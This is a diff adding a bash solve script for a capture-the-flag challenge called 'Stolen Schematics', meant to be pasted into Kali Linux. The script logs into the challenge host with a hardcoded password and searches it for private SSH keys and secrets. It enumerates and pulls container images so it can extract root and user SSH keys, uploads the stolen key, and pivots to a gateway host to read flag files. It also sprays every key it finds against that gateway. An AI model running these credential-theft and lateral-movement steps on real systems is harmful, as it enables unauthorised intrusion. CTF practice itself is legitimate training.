@@ -1,0 +1,124 @@
+################################################################################
+# STOLEN SCHEMATICS - RECONNAISSANCE & SOLVE
+# Port: 32887 | Password: reyalp
+# COPY AND PASTE THESE COMMANDS IN KALI LINUX
+################################################################################
+
+# STEP 1: Connect and gather intelligence
+################################################################################
+sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no -p 32887 player@instance.ctf.tdho.st << 'EOF'
+echo "=== SYSTEM INFO ==="
+hostname
+whoami
+pwd
+echo ""
+
+echo "=== LOOKING FOR CLUES ==="
+ls -la ~
+ls -la ~/.ssh 2>/dev/null
+cat ~/README* 2>/dev/null
+cat ~/.ssh/README* 2>/dev/null
+echo ""
+
+echo "=== ENVIRONMENT VARIABLES ==="
+env | grep -i -E "docker|image|ghcr|container|registry"
+echo ""
+
+echo "=== NETWORK INFO ==="
+ip addr | grep inet
+cat /etc/hosts
+echo ""
+
+echo "=== TRYING GATEWAY ACCESS ==="
+ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 player@172.27.0.1 2>&1 | head -5
+ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@172.27.0.1 2>&1 | head -5
+echo ""
+
+echo "=== CHECKING FOR EXISTING KEYS ==="
+find ~ -name "*.pem" -o -name "id_rsa*" -o -name "*.key" 2>/dev/null
+echo ""
+
+echo "=== PROCESS INFO ==="
+ps aux | head -20
+echo ""
+
+exit
+EOF
+
+
+# STEP 2: Try to find the correct GHCR image
+################################################################################
+echo ""
+echo "=== ATTEMPTING TO FIND PUBLIC GHCR IMAGE ==="
+
+# Use GitHub API to enumerate
+curl -s "https://api.github.com/orgs/talldwarfhosting/packages?package_type=container" | grep '"name"' | head -10
+
+# Try common patterns
+for name in mc-server minecraft-server game-server server stolen-schematics schematics challenge; do
+    for tag in latest v1 v0.1 v1.0 2024 2025; do
+        echo "[*] Trying: ghcr.io/talldwarfhosting/$name:$tag"
+        timeout 5 docker manifest inspect ghcr.io/talldwarfhosting/$name:$tag >/dev/null 2>&1
+        if [ $? -eq 0 ]; then
+            echo "✓✓✓ FOUND: ghcr.io/talldwarfhosting/$name:$tag"
+            export IMAGE="ghcr.io/talldwarfhosting/$name:$tag"
+            break 2
+        fi
+    done
+done
+
+
+# STEP 3: If we found the image, extract key and get flag
+################################################################################
+if [ ! -z "$IMAGE" ]; then
+    echo "=== EXTRACTING SSH KEY FROM IMAGE ==="
+    docker pull $IMAGE
+    docker run --rm $IMAGE cat /root/.ssh/id_rsa > /tmp/stolen_key 2>/dev/null || \
+    docker run --rm $IMAGE cat /home/player/.ssh/id_rsa > /tmp/stolen_key 2>/dev/null || \
+    docker run --rm $IMAGE cat /root/.ssh/id_ed25519 > /tmp/stolen_key 2>/dev/null
+    
+    if [ -s /tmp/stolen_key ]; then
+        echo "✓ SSH key extracted!"
+        chmod 600 /tmp/stolen_key
+        cat /tmp/stolen_key
+        
+        echo ""
+        echo "=== UPLOADING KEY TO INSTANCE ==="
+        sshpass -p "reyalp" scp -o StrictHostKeyChecking=no -P 32887 /tmp/stolen_key player@instance.ctf.tdho.st:/tmp/key
+        
+        echo ""
+        echo "=== GETTING FLAG ==="
+        sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no -p 32887 player@instance.ctf.tdho.st 'chmod 600 /tmp/key && ssh -i /tmp/key -o StrictHostKeyChecking=no player@172.27.0.1 "cat /etc/flag.txt || cat /flag.txt || cat ~/flag.txt || find / -name flag.txt 2>/dev/null | xargs cat"'
+    fi
+else
+    echo "❌ No public image found. Trying alternative approach..."
+fi
+
+
+# ALTERNATIVE: Check if key is already in the container
+################################################################################
+echo ""
+echo "=== ALTERNATIVE: SEARCHING INSIDE CONTAINER ==="
+sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no -p 32887 player@instance.ctf.tdho.st << 'EOF'
+# Look for Docker socket
+if [ -S /var/run/docker.sock ]; then
+    echo "Docker socket found! Trying to access..."
+    docker ps -a 2>/dev/null
+    docker images 2>/dev/null
+fi
+
+# Look for mounted keys
+find / -name "id_rsa*" -o -name "*.pem" 2>/dev/null | head -10
+
+# Check if we can access gateway with any existing key
+for key in $(find / -name "id_rsa*" 2>/dev/null); do
+    echo "Trying key: $key"
+    chmod 600 $key 2>/dev/null
+    timeout 3 ssh -i $key -o StrictHostKeyChecking=no player@172.27.0.1 "cat /etc/flag.txt" 2>/dev/null && break
+done
+
+exit
+EOF
+
+echo ""
+echo "=== RECON COMPLETE ==="
